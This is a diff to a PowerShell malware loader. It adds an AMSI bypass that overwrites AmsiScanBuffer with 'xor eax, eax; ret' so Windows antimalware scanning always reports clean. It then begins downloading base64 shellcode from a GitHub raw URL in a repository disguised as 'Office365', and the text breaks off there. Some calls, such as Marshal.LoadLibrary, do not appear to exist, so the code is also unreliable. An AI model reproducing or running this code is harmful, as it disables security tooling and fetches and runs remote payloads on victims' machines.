@@ -1,12 +1,16 @@
-# AMSI Bypass
+# AMSI Bypass - Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN (0)
 try {
-    $sig = @"
-[DllImport("amsi.dll")]
-public static extern int AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, int length, string contentName, IntPtr eventContext, out int result);
-"@
-    $amsi = Add-Type -MemberDefinition $sig -Name "Amsi" -PassThru
-    [System.Runtime.InteropServices.Marshal]::WriteInt32($amsi::AmsiScanBuffer.GetMethod().Handle, 0)
+    # Load amsi.dll and get AmsiScanBuffer function
+    $amsi = [System.Runtime.InteropServices.Marshal]::LoadLibrary("amsi.dll")
+    $scanBuffer = [System.Runtime.InteropServices.Marshal]::GetProcAddress($amsi, "AmsiScanBuffer")
+    
+    # Patch the function to return 0 (AMSI_RESULT_CLEAN)
+    # Write 'xor eax, eax; ret' at the function entry
+    $patch = [byte[]]@(0x31, 0xC0, 0xC3)
+    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 3)
 } catch {}
+
+# Original loader code
 try {
     $url = "https://raw.githubusercontent.com/wolfgangphelan994924/Office365/main/shellcode_b64.txt"
     $wc = New-Object System.Net.WebClient
